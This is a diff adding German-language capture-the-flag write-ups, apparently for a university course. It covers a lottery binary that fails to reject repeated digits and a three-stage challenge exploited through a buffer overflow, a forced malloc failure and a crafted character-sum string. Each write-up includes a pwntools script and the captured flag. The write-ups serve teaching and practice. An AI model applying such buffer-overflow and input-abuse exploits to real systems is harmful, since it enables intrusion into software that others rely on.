@@ -706,7 +706,88 @@ int christmasMagic(uint x,uint y,uint z)
 ```
 
 Wir erkennen wahrscheinlich nicht sofort, dass es sich hierbei um eine mixed boolean algebra expression handelt und stellen einen Carnaugh-Table auf und vereinfachen die "Schaltung" zu einem einfachen return x + y. christmasMagic berechnet also nur eine triviale Addition.
+```
+```
+# team 06
 
+FLAG{LuckyNumberSlevin} 
+
+Von pwnable.kr geklaut leider (kenne es noch von früher), ansonsten wäre es ein verdammt gutes ctf
+
+Lösung:
+In dieser Schleife
+```c
+  for (i = 0; i < 6; i = i + 1) {
+    for (inputNum = 0; inputNum < 6; inputNum = inputNum + 1) {
+      if (drawnNumbers[i] == *(byte *)((long)&eingabe + (long)inputNum)) {
+        correctNumbers = correctNumbers + 1;
+      }
+    }
+  }
+```
+
+Wird nicht geprüft, ob eine Ziffer doppelt vorkommt in der Eingabe, dadurch kann man einfach 6x das gleiche Zeichen einfügen und ein paar mal versuchen bis die zahl dabei ist (die dann 6-fach gewertet wird)
+
+Wir benutzen hier `******`, weil 42 meine Lieblingszahl ist (for the moment)
+
+Script:
+```python
+from pwn import *
+
+# sorry dear server ;P
+# DON'T RUN THIS LOCALLY!
+while True:
+    # pty = process.PTY
+    # p = process("./team_06", stdin=pty, stdout=pty)
+    p = remote("tank.informatik.hs-mannheim.de", 3106)
+
+    p.sendlineafter(b": ", b"******")
+    flag = p.recvall().decode()
+    print(flag, "FLAG{" in flag)
+    if "FLAG{" in flag:
+        print("worked", flag)
+        break
+```
+# Assignment 33 - Team 05
+
+
+## Notiz
+Flag.. steht plain drin
+
+## Beschreibung
+Dreistufiges CTF, bei welchem mehrere Eingaben getätigt werden müssen, um die Flag zu erhalten. (Oder man hat Augen und schaut einfach in den Code..)
+
+**Stufe 1:**  
+Bufferoverflow auf zwei Variablen, müssen ScoobyDo ergeben
+
+**Stufe 2:**  
+Malloc muss null returnen, daher muss zuviel Speicher allokiert werden; einfach eine sehr große Zahl eingeben (siehe Script).
+
+**Stufe 3:**  
+Zeichen müssen 2024 ergeben, wenn man die charCodes addiert. String muss mit einem Nullbyte enden (oder genau 21 Zeichen lang sein).
+Wir verwenden 16 mal das Zeichen x (120) und einmal h (104), und erhalten 2024 in unter 21 Zeichen (plus ein Nullbyte).
+
+## Script
+
+```python
+from pwn import *
+
+pty = process.PTY
+p = process("./team_05", stdin=pty, stdout=pty)
+# p = remote("tank.informatik.hs-mannheim.de", 3105)
+# context.log_level = 'debug'
+
+p.sendlineafter(b":", b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAScoobyDo")
+p.sendlineafter(b"!", b"99999999999999999999999")
+p.sendlineafter(b"...", b"xxxxxxxxxxxxxxxxh\x00") # 2024 = 16 * 120 + 104 
+
+# p.recvuntil("FLAG{")
+flag = p.recvall().decode()
+
+print(flag)
+## Flag
+FLAG{scooby_dooby_doo_where_are_you?}
+```
 #  Team 04
 ```
 
